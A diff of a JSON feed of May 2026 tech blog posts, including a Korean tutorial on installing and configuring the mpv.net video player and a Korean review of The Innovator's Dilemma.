+    "description": "Meta’s data ingestion system, which our engineering teams leverage for up-to-date snapshots of the social graph, has recently undergone a significant revamp to enhance its reliability at scale.  Moving from our legacy system to our new architecture required a large-scale migration of our entire data ingestion system.  We’re sharing the solutions and strategies that enabled [...]\nRead More...\nThe post Migrating Data Ingestion Systems at Meta Scale appeared first on Engineering at Meta.",
+    "reviews": [],
+    "syllabus": [],
+    "link": "https://engineering.fb.com/2026/05/12/data-infrastructure/migrating-data-ingestion-systems-at-meta-scale/",
+    "pubDate": "Tue, 12 May 2026 16:00:57 +0000",
+    "creator": "Unknown",
+    "categories": [
+      "Data Infrastructure"
+    ]
+  },
+  {
+    "id": 8,
+    "imageUrl": "",
+    "title": "VSLive! Microsoft AI Hackathon 2026: Send Your Team Home With Working Code",
+    "description": "If you lead a development team, you already know the pattern. You approve the travel, your developers attend a great conference, they come back energized, and then the work resumes exactly as it was. The ideas don’t survive contact with the backlog. This July at VSLive! @ Microsoft HQ in Redmond, we’re trying to change […]\nThe post VSLive! Microsoft AI Hackathon 2026: Send Your Team Home With Working Code appeared first on Visual Studio Blog.",
+    "reviews": [],
+    "syllabus": [],
+    "link": "https://devblogs.microsoft.com/visualstudio/vslive-microsoft-ai-hackathon-2026-send-your-team-home-with-working-code/",
+    "pubDate": "Thu, 14 May 2026 15:05:55 +0000",
+    "creator": "Jim Harrer",
+    "categories": [
+      "Events",
+      "Visual Studio",
+      "vslive"
+    ]
+  },
+  {
+    "id": 9,
+    "imageUrl": "",
+    "title": "Compose Multiplatform 1.11.0 Is Now Available",
+    "description": "A new release of Compose Multiplatform has landed, with improvements to the iOS and web experience and a refreshed approach to UI testing. Read on for the highlights, or for the complete list of changes, check out the What’s New. Get Started with Compose Multiplatform Native text input on iOS If you’ve wanted text fields […]",
+    "reviews": [],
+    "syllabus": [],
+    "link": "https://blog.jetbrains.com/kotlin/2026/05/compose-multiplatform-1-11-0/",
+    "pubDate": "Fri, 15 May 2026 12:50:18 +0000",
+    "creator": "Elvira Mustafina",
+    "categories": [
+      "multiplatform",
+      "releases",
+      "compose-multiplatform"
+    ]
+  },
+  {
+    "id": 10,
+    "imageUrl": "",
+    "title": "MSVC Build Tools Preview updates – May 2026",
+    "description": "Try the latest updates to MSVC Build Tools Preview\nThe post MSVC Build Tools Preview updates – May 2026 appeared first on C++ Team Blog.",
+    "reviews": [],
+    "syllabus": [],
+    "link": "https://devblogs.microsoft.com/cppblog/msvc-build-tools-preview-updates-may-2026/",
+    "pubDate": "Wed, 13 May 2026 21:07:01 +0000",
+    "creator": "Eric Brumer",
+    "categories": [
+      "C++"
+    ]
+  },
+  {
+    "id": 11,
+    "imageUrl": "",
+    "title": "조선 시대 사람들은 어떻게 재테크를 했을까?",
+    "description": "조선 유일의 재테크 서적에 기록된 부자들",
+    "reviews": [],
+    "syllabus": [],
+    "link": "https://toss.im/tossfeed/article/behindthemoney-16",
+    "pubDate": "Thu, 14 May 2026 09:09:00 GMT",
+    "creator": "Unknown",
+    "categories": []
+  },
+  {
+    "id": 12,
+    "imageUrl": "",
+    "title": "Support for uv, Poetry, and Hatch Workspaces (Beta)",
+    "description": "Workspaces are increasingly the go-to choice for companies and open-source teams aiming to manage shared code, enforce consistency, and simplify dependency management across multiple services. Working within massive codebases often means juggling many interdependent Python projects simultaneously. To streamline this experience, PyCharm 2026.1.1 introduced built-in support for uv workspaces, as well as those managed by Poetry […]",
+    "reviews": [],
+    "syllabus": [],
+    "link": "https://blog.jetbrains.com/pycharm/2026/05/support-for-uv-poetry-and-hatch-workspaces-beta/",
+    "pubDate": "Wed, 13 May 2026 12:28:25 +0000",
+    "creator": "Antonina Belianskaya",
+    "categories": [
+      "uv",
+      "workspaces"
+    ]
+  },
+  {
     "id": 13,
     "imageUrl": "",
+    "title": "목적 없이 걸어도 즐거운 도시 탐험, 이환",
+    "description": "No description available",
+    "reviews": [],
+    "syllabus": [],
+    "link": "https://bbs.ruliweb.com/news/board/11/read/2452",
+    "pubDate": "Wed, 13 May 2026 03:58:35 +0900",
+    "creator": "｜RULIWEB｜",
+    "categories": [
+      "리뷰"
+    ]
+  },
+  {
+    "id": 14,
+    "imageUrl": "",
     "title": "mpv.net, 가볍고 빠른 동영상 플레이어, mpv 윈도용",
-    "description": "mpv.net은 mpv라는 동영상 플레이어의 윈도 프론트엔드로서 윈도11에서 성능이 좋은 동영상 플레이어다. 원래 mpv는 리눅스에서 많이 사용되지만 윈도에서도 많이 사용되는 편이다. mpv의 특징은 가볍고 빠른 점으로서 팟플레이어보다 실행 속도가 훨씬 빠른 편이다.\n참고로 동영상 플레이어는 플랫폼에 따라서 다음과 같은 프로그램들이 많이 사용된다.\n리눅스 : mpv\n윈도 : 팟플레이어, mpv.net\nMacOS : IINA https://iina.io/\n \n1. mpv.net의 설치\n윈도 11에는 패키지 설치 프로그램인 winget이 설치되어있으므로 winget install mpv.net 명령으로 빠르게 설치할 수 있다. 아래는 winget 설치 명령을 내린 뒤 캡쳐한 화면이다.\nPS C:\\Users\\SYKIM> winget install mpv.net\n찾음 mpv.net [mpv.net] 버전 7.1.2.0\n이 응용 프로그램의 라이선스는 그 소유자가 사용자에게 부여했습니다.\nMicrosoft는 타사 패키지에 대한 책임을 지지 않고 라이선스를 부여하지도 않습니다.\n이 패키지에는 다음 종속성이 필요합니다.\n  - 패키지\n      Microsoft.DotNet.DesktopRuntime.10\n(1/1) 찾음 Microsoft .NET Windows Desktop Runtime 10.0 [Microsoft.DotNet.DesktopRuntime.10] 버전 10.0.8\n이 응용 프로그램의 라이선스는 그 소유자가 사용자에게 부여했습니다.\nMicrosoft는 타사 패키지에 대한 책임을 지지 않고 라이선스를 부여하지도 않습니다.\n다운로드 중 https://builds.dotnet.microsoft.com/dotnet/WindowsDesktop/10.0.8/windowsdesktop-runtime-10.0.8-win-x64.exe\n  ██████████████████████████████  57.1 MB / 57.1 MB\n설치 관리자 해시를 확인했습니다.\n패키지 설치를 시작하는 중...\n설치 성공\n\n다운로드 중 https://github.com/mpvnet-player/mpv.net/releases/download/v7.1.2.0/mpv.net-v7.1.2.0-setup-x64.exe\n  ██████████████████████████████  36.2 MB / 36.2 MB\n설치 관리자 해시를 확인했습니다.\n패키지 설치를 시작하는 중...\n설치 관리자가 관리자 권한으로 실행을 요청합니다. 프롬프트가 표시됩니다.\n설치 성공\n \n2. mpv.net의 실행 및 동영상 재상 방법\n설치 후 프로그램 목록에 보면 mpv.net이 보일 것이다. mpv.net을 실행하고 동영상을 끌어다 놓으면 재생 된다. 마우스로 클릭해서 실행하거나 엔터로 실행하려면 파일 확장자를 연결해야 하는데, 제어판(설정)에서 직접 연결하거나 아니면 mpv.net 실행 후 아래 그림처럼 마우스 오른 버튼으로 메뉴를 띄우고, \"Config - 시스템 설정 - 비디오 파일 연결 등록\"을 실행해서 하면 된다.\nmpv.net 시스템 설정\n\n\n \n3. mpv.net의 환경 설정\nmpv.net은 그냥 사용해도 별 문제는 없지만, 약간의 커스터마이징으로 더 성능을 끌어올리거나 편리하게 사용할 수 있다. 그런데 mpv처럼 mpv.net도 환경 설정이 2가지로 나뉘어져 있어서 각각 편집해야 한다. 우선 재생이나 여러가지 기능에 대한 것은 mpv.conf 파일에 저장되고, 단축키 같은 기능은 input.conf 파일에 설정한다. 이들의 설정 방법은 앞서 linux의 mpv에서도 잠깐 설명한 적이 있다.[1]\n2018.08.19 - [컴퓨터 관련/리눅스 데스크탑] - MPV 리눅스 미디어 플레이어 설정\nmpv.conf 파일은 직접 text editor로 편집해도 되지만, \"구성 편집기 표시\"에서 GUI로 기능을 선택할 수도 있다. 그리고 input.conf도 \"입력 편집기 표시\"에서 GUI로 작업할 수도 있다. 하지만 여기서는 귀찮기 때문에 그냥 \"mpv.conf 파일 편집\"과 \"input.conf 파일 편집\" 메뉴로 직접 파일에 넣는 방법을 사용할 것이다.\n \n3.1. mpv.conf 파일 편집\n\n\n위 그림처럼 메뉴에서 \"Config - mpv.conf 파일 편집\"을 선택하면 편집기가 뜨고, 빈 파일이 보일 것이다. 처음에는 설정된 것이 없기 때문에 빈 파일이다. 여기에 아래와 같은 내용을 넣고 저장한다. \nhwdec=auto\nhwdec-codecs=all\nvo=gpu-next\ngpu-api=d3d11\nborder=no\nautofit-larger=100\n\n# 종료 할 때 창의 위치, 크기, 동영상 파일의 재생 위치 등을 기억하도록 하는 기능이다.\nsave-position-on-quit=yes\nwatch-later-options=window-pos,window-size,start\n\n# 재생이 완료된 경우 창을 그대로 둔다. yes로 하면 다음 이름의 파일을 연속해서 재생해준다.\nkeep-open=always\n\nkeepaspect-window=no\n\n# 오디오와 비디오 싱크가 안 맞을 때 비디오 프레임을 버려가며 맞춤\nframedrop=yes\n# 키프레임 버그 등으로 헤맬 때 디코더 성능을 최대로 끌어올림\nvd-lavc-fast=yes\n# 디코딩이 밀리면 프레임을 건너뛰어 싱크를 유지 (팟플레이어 방식)\nframedrop=vo\n# 탐색(Seek)할 때 정확한 프레임 대신 가장 가까운 키프레임으로 빠르게 이동\nhr-seek=no\n\n# 캐시 기능을 항상 켜기 (인터넷 스트리밍 및 로컬 파일 모두 적용)\ncache=yes\n# 캐시로 사용할 메모리 용량 설정 (예: 512MB / 컴퓨터 사양이 좋다면 1024MiB도 가능)\ndemuxer-max-bytes=1024MiB\n# 뒤로 가기(Seek)할 때를 대비해 이미 지나간 영상도 캐시에 남겨둘 용량 (예: 100MB)\ndemuxer-max-back-bytes=200MiB\n\n# 영상을 재생하기 전에 미리 초 단위로 읽어둘 분량 (예: 최소 5초, 최대 10초 분량)\ncache-secs=10\n간혹 nvidia GPU를 사용하는 경우 하드웨어 가속이 제대로 안되는 경우가 있는데, 이런 경우에는 1행의 hwdec를 hwdec=nvdec으로 변경하도록 한다.\n위 mpv.conf에는 대부분 설명을 달아두었지만, 다른 값으로 변경하려면 Ctrl + , 를 눌러서 GUI 화면에서 변경하면 된다.\n \n3.2. input.conf 파일 편집\n기본키에 편리한 다른 단축키를 입히는 것이다. 본인은 마우스 휠과 asdw와 q, e키를 다음과 같이 매핑해서 사용하였다.\nWheel_up add volume +2\nWheel_down add volume -2\nw no-osd seek -30 exact\ns no-osd seek 30 exact\na no-osd seek -10 \nd no-osd seek 10\ne script-binding osc/visibility\n마우스 휠을 움직이면 볼륨을 +2, -2하도록 했고, w를 누르면 30초 이전으로 이동하되, no-osd를 지정해서 화면 중간에 OSD 막대가 나오지 않도록 했다. 그리고 현재 어디까지 플레이했는지 시간 정보를 보기 위해 e키에 OSC 화면 메뉴를 토글하는 기능을 넣어두었으니 여러번 눌러보면 직관적으로 이해될 것이다.\nmpv.net은 리눅스의 mpv와 대부분의 설정이 호환되지만, 간혹 몇몇은 다르기도 했으므로 주의하여야 한다.\n \n4. 결론\nmpv (혹은 mpv.net)는 진짜 가볍고 빠른 동영상 플레이어이므로 꼭 사용해보는 것을 추천한다.\n \n참조\n[1] mpv 설정법, https://sunyzero.tistory.com/255\n \n \n히스토리\n2026.05.17 초안.",
+    "description": "mpv.net은 mpv라는 동영상 플레이어의 윈도 프론트엔드로서 윈도11에서 성능이 좋은 동영상 플레이어다. 원래 mpv는 리눅스에서 많이 사용되지만 윈도에서도 많이 사용되는 편이다. mpv의 특징은 가볍고 빠른 점으로서 팟플레이어보다 실행 속도가 훨씬 빠른 편이다.\n참고로 동영상 플레이어는 플랫폼에 따라서 다음과 같은 프로그램들이 많이 사용된다.\n리눅스 : mpv\n윈도 : 팟플레이어, mpv.net\nMacOS : IINA https://iina.io/\n \n1. mpv.net의 설치\n윈도 11에는 패키지 설치 프로그램인 winget이 설치되어있으므로 winget install mpv.net 명령으로 빠르게 설치할 수 있다. 아래는 winget으로 mpv.net 설치 명령을 내린 뒤 캡쳐한 화면이다.\nPS C:\\Users\\SYKIM> winget install mpv.net\n찾음 mpv.net [mpv.net] 버전 7.1.2.0\n이 응용 프로그램의 라이선스는 그 소유자가 사용자에게 부여했습니다.\nMicrosoft는 타사 패키지에 대한 책임을 지지 않고 라이선스를 부여하지도 않습니다.\n이 패키지에는 다음 종속성이 필요합니다.\n  - 패키지\n      Microsoft.DotNet.DesktopRuntime.10\n(1/1) 찾음 Microsoft .NET Windows Desktop Runtime 10.0 [Microsoft.DotNet.DesktopRuntime.10] 버전 10.0.8\n이 응용 프로그램의 라이선스는 그 소유자가 사용자에게 부여했습니다.\nMicrosoft는 타사 패키지에 대한 책임을 지지 않고 라이선스를 부여하지도 않습니다.\n다운로드 중 https://builds.dotnet.microsoft.com/dotnet/WindowsDesktop/10.0.8/windowsdesktop-runtime-10.0.8-win-x64.exe\n  ██████████████████████████████  57.1 MB / 57.1 MB\n설치 관리자 해시를 확인했습니다.\n패키지 설치를 시작하는 중...\n설치 성공\n\n다운로드 중 https://github.com/mpvnet-player/mpv.net/releases/download/v7.1.2.0/mpv.net-v7.1.2.0-setup-x64.exe\n  ██████████████████████████████  36.2 MB / 36.2 MB\n설치 관리자 해시를 확인했습니다.\n패키지 설치를 시작하는 중...\n설치 관리자가 관리자 권한으로 실행을 요청합니다. 프롬프트가 표시됩니다.\n설치 성공\n \n2. mpv.net의 실행 및 동영상 재상 방법\n설치 후 프로그램 목록에 보면 mpv.net이 보일 것이다. mpv.net을 실행하고 동영상을 끌어다 놓으면 재생 된다. 마우스로 클릭해서 실행하거나 엔터로 실행하려면 파일 확장자를 연결해야 하는데, 제어판(설정)에서 직접 연결하거나 아니면 mpv.net 실행 후 아래 그림처럼 마우스 오른 버튼으로 메뉴를 띄우고, \"Config - 시스템 설정 - 비디오 파일 연결 등록\"을 실행해서 하면 된다.\nmpv.net 시스템 설정\n\n\n \n3. mpv.net의 환경 설정\nmpv.net은 그냥 사용해도 별 문제는 없지만, 약간의 커스터마이징으로 더 성능을 끌어올리거나 편리하게 사용할 수 있다. 그런데 mpv처럼 mpv.net도 환경 설정이 2가지로 나뉘어져 있어서 각각 편집해야 한다. 우선 재생이나 여러가지 기능에 대한 것은 mpv.conf 파일에 저장되고, 단축키 같은 기능은 input.conf 파일에 설정한다. 이들의 설정 방법은 앞서 linux의 mpv에서도 잠깐 설명한 적이 있다.[1]\n2018.08.19 - [컴퓨터 관련/리눅스 데스크탑] - MPV 리눅스 미디어 플레이어 설정\nmpv.conf 파일은 직접 text editor로 편집해도 되지만, \"구성 편집기 표시\"에서 GUI로 기능을 선택할 수도 있다. 그리고 input.conf도 \"입력 편집기 표시\"에서 GUI로 작업할 수도 있다. 하지만 여기서는 귀찮기 때문에 그냥 \"mpv.conf 파일 편집\"과 \"input.conf 파일 편집\" 메뉴로 직접 파일에 넣는 방법을 사용할 것이다.\n \n3.1. mpv.conf 파일 편집\n\n\n위 그림처럼 메뉴에서 \"Config - mpv.conf 파일 편집\"을 선택하면 편집기가 뜨고, 빈 파일이 보일 것이다. 처음에는 설정된 것이 없기 때문에 빈 파일이다. 여기에 아래와 같은 내용을 넣고 저장한다. \nhwdec=auto\nhwdec-codecs=all\nvo=gpu-next\ngpu-api=d3d11\nborder=no\nautofit-larger=100\n\n# 종료 할 때 창의 위치, 크기, 동영상 파일의 재생 위치 등을 기억하도록 하는 기능이다.\nsave-position-on-quit=yes\nwatch-later-options=window-pos,window-size,start\n\n# 재생이 완료된 경우 창을 그대로 둔다. yes로 하면 다음 이름의 파일을 연속해서 재생해준다.\nkeep-open=always\n\nkeepaspect-window=no\n\n# 오디오와 비디오 싱크가 안 맞을 때 비디오 프레임을 버려가며 맞춤\nframedrop=yes\n# 키프레임 버그 등으로 헤맬 때 디코더 성능을 최대로 끌어올림\nvd-lavc-fast=yes\n# 디코딩이 밀리면 프레임을 건너뛰어 싱크를 유지 (팟플레이어 방식)\nframedrop=vo\n# 탐색(Seek)할 때 정확한 프레임 대신 가장 가까운 키프레임으로 빠르게 이동\nhr-seek=no\n\n# 캐시 기능을 항상 켜기 (인터넷 스트리밍 및 로컬 파일 모두 적용)\ncache=yes\n# 캐시로 사용할 메모리 용량 설정 (예: 512MB / 컴퓨터 사양이 좋다면 1024MiB도 가능)\ndemuxer-max-bytes=1024MiB\n# 뒤로 가기(Seek)할 때를 대비해 이미 지나간 영상도 캐시에 남겨둘 용량 (예: 100MB)\ndemuxer-max-back-bytes=200MiB\n\n# 영상을 재생하기 전에 미리 초 단위로 읽어둘 분량 (예: 최소 5초, 최대 10초 분량)\ncache-secs=10\n간혹 nvidia GPU를 사용하는 경우 하드웨어 가속이 제대로 안되는 경우가 있는데, 이런 경우에는 1행의 hwdec를 hwdec=nvdec으로 변경하도록 한다.\n위 mpv.conf에는 대부분 설명을 달아두었지만, 다른 값으로 변경하려면 Ctrl + , 를 눌러서 GUI 화면에서 변경하면 된다.\n \n3.2. input.conf 파일 편집\n기본키에 편리한 다른 단축키를 입히는 것이다. 본인은 마우스 휠과 asdw와 q, e키를 다음과 같이 매핑해서 사용하였다.\nWheel_up add volume +2\nWheel_down add volume -2\nw no-osd seek -30 exact\ns no-osd seek 30 exact\na no-osd seek -10 \nd no-osd seek 10\ne script-binding osc/visibility\n마우스 휠을 움직이면 볼륨을 +2, -2하도록 했고, w를 누르면 30초 이전으로 이동하되, no-osd를 지정해서 화면 중간에 OSD 막대가 나오지 않도록 했다. 그리고 현재 어디까지 플레이했는지 시간 정보를 보기 위해 e키에 OSC 화면 메뉴를 토글하는 기능을 넣어두었으니 여러번 눌러보면 직관적으로 이해될 것이다.\nmpv.net은 리눅스의 mpv와 대부분의 설정이 호환되지만, 간혹 몇몇은 다르기도 했으므로 주의하여야 한다.\n \n4. 결론\nmpv (혹은 mpv.net)는 진짜 가볍고 빠른 동영상 플레이어이므로 꼭 사용해보는 것을 추천한다.\n \n참조\n[1] mpv 설정법, https://sunyzero.tistory.com/255\n \n \n히스토리\n2026.05.17 초안.",
     "reviews": [],
     "syllabus": [],
     "link": "https://sunyzero.tistory.com/329",
@@ -215,33 +219,15 @@
     ]
   },
   {
-    "id": 14,
-    "imageUrl": "",
-    "title": "ODW #6: Git 자동화 관점에서 본 MCP와 에이전트 스킬의 장단점",
-    "description": "안녕하세요. 서비스에 필요한 AI 모델과 솔루션을 개발하는 AI Lab 팀의 한길로입니다. 저는 최근에 LY Corporation에서 사내 행사로 진행한 Orchestration ...",
-    "reviews": [],
-    "syllabus": [],
-    "link": "https://techblog.lycorp.co.jp/ko/git-automation-mcp-vs-agent-skills-pros-and-cons",
-    "pubDate": "Fri, 15 May 2026 02:00:00 GMT",
-    "creator": "Unknown",
-    "categories": []
-  },
-  {
     "id": 15,
     "imageUrl": "",
-    "title": "Viaduct 1.0 and the future of Airbnb’s data mesh",
-    "description": "No description available",
+    "title": "혁신기업의 딜레마(The innovator's dilemma)",
+    "description": "<p><img src=\"/images/2026/05/13/IMG_1876.png\" alt=\"The innovator's dilemma\" title=\"The innovator's dilemma\" class=\"center-image\" /></p>\n\n<p>책을 읽으면서 계속 떠올랐던 건, 기존 강자들은 보통 가장 약한 부분이 아니라, 가장 잘하던 방식 때문에 무너진다는 점이 흥미로웠다.</p>\n\n<p>흔히 어떤 기업이 망하면 의사결정을 못했다거나, 기술력이 부족했다거나, 고객을 이해하지 못했다고 생각한다. 그런데 클레이튼 크리스텐슨은 오히려 반대 이야기를 한다. 고객 이야기를 너무 잘 듣고, 현재 사업을 너무 잘 운영하고 조직이 너무 효율적이기 때문에 새로운 변화를 놓친다는 것이다. 대부분의 조직은 ‘잘하는 방법’을 학습하면서 성장한다. 매출이 잘 나오는 고객에게 집중하고, KPI를 개선하고 효율을 높인다. 사실 틀린 게 하나도 없다. 오히려 굉장히 합리적이고 교과서적인 방식이다. 그런데 문제는 미래의 혁신은 거의 항상 지금 기준으로 보면 비효율적이라는 점이다.</p>\n\n<p>책에서 가장 많이 등장하는 단어인 파괴적 혁신(Disruptive Innovation). 초기의 파괴적 혁신은 늘 이상하다. 시장은 작고 고객은 별로 없어 보이고, 제품 완성도도 낮다. 지금 기준으로 보면 굳이 해야 할 이유가 없어 보인다. 그런데 시간이 지나면서 그 작은 변화가 기존 시장 전체를 바꿔버린다. 넷플릭스가 처음 등장했을 때 블록버스터 입장에서는 꽤 애매했을 것 같다. DVD를 우편으로 보내준다니. 게다가 스트리밍 초기 품질도 좋지 않았다. 그런데 결국 사람들은 비디오 대여점에 가지 않게 되었다. 노키아가 아이폰을 처음 봤을 때도 비슷했을 것이다. 전화기라기보단 느린 컴퓨터처럼 보였을지도 모른다.</p>\n\n<p>그리고 기존 강자들은 대부분 틀린 판단을 한 게 아니다. 당시 기준으로 보면 다 합리적이었다. 오히려 문제는 현재의 성공 방식이 미래 변화를 이해하지 못하게 만든다는 데 있었다. 지금 고객이 원하는 것, 지금 돈이 되는 것 그리고 지금 잘 작동하는 방식에 집중할수록 새로운 흐름은 더 작고 이상하게 보인다.</p>\n\n<p>요즘은 AI를 여기에 비춰볼 수 있을것 같다. 지금 대부분의 서비스는 ‘사용자가 직접 앱을 열고 탐색하는 구조’ 를 전제로 만들어져 있다. 검색도 그렇고 쇼핑도 그렇고 배달도 그렇다. 그런데 생성형 AI가 나오면서 이 흐름 자체를 바꾸고 있다. 점점 검색 결과 페이지보다 ‘답변’이 중요해지고 있고, 사용자가 여러 앱을 돌아다니기보다 AI 에이전트가 대신 처리해준다던가.</p>\n\n<p>그런데 기존 플랫폼 입장에서 이 변화는 꽤 어려울 것 같다. 지금 너무나도 잘 돌아가고 있기 때문.. 예를 들어, 검색 광고 모델은 검색 결과 페이지를 많이 보여줘야 한다. 하지만 AI는 링크 대신 답변을 준다. 체류시간 기반 서비스는 사용자가 오래 머물러야 좋다. 그런데 AI 에이전트는 오히려 클릭과 탐색을 줄인다. 결국 미래 방향이 기업 입장에서의 현재 수익 모델과 충돌한다. 그래서 혁신 기업의 딜레마는 단순히’“새로운 기술이 등장했다’ 가 아니라, 기존 성공 방식이 미래 변화를 막는 구조에 더 가까운 것 같았다.</p>\n\n<p>이 책에서는 기업에 대한 이야기만 하는데 개인에 대해서도 비슷하다. 사람도 어느 순간부터 자기가 잘하는 것만 반복하게 된다. 이미 인정받은 방식, 익숙한 선택과 성과를 냈던 패턴들. 효율은 점점 좋아진다. 대신 새로운 걸 시도하는 감각은 조금씩 사라진다. 그리고 대부분의 변화는 늘 비효율적으로 시작된다. 운동, 글쓰기, 새로운 분야에 대해 학습하는것. 처음엔 늘 못한다. 괜히 시간 낭비하는 기분도 든다. 그래서 대부분 다시 원래 잘하던 걸 하러 돌아간다. 꾸준히 무언가를 배우는 사람들의 공통점은 초기의 비효율을 견디는 능력인 것 같다. 기업은 작은 시장을 견디지 못하고 사람은 서툰 시기를 견디지 못한다.</p>\n\n<p>혁신은 대부분 기존 시장의 중심이 아니라 가장자리에서 시작된다. 혼다의 슈퍼커브가 과거에는 보이지 않던 새로운 시장을 열어준 것처럼, 처음엔 별로 중요하지 않아 보이는 사람들과 작은 취향, 이상한 행동들에서 변화가 시작된다. 혁신 기업의 딜레마는 단순한 경영 이론이라기보다, 성공이 어떻게 사람과 조직을 점점 보수적으로 만드는지에 대한 이야기다.</p>",
     "reviews": [],
     "syllabus": [],
-    "link": "https://medium.com/airbnb-engineering/viaduct-1-0-and-the-future-of-airbnbs-data-mesh-6bab4ec98b89?source=rss----53c7c27702d5---4",
-    "pubDate": "Wed, 13 May 2026 17:01:01 GMT",
-    "creator": "Adam Miskiewicz",
-    "categories": [
-      "api",
-      "engineering",
-      "data",
-      "open-source",
-      "graphql"
-    ]
+    "link": "https://sungjk.github.io/2026/05/13/the-innovators-dilemma.html",
+    "pubDate": "2026-05-13T00:00:00+00:00",
+    "creator": "Unknown",
+    "categories": []
   }
 ]
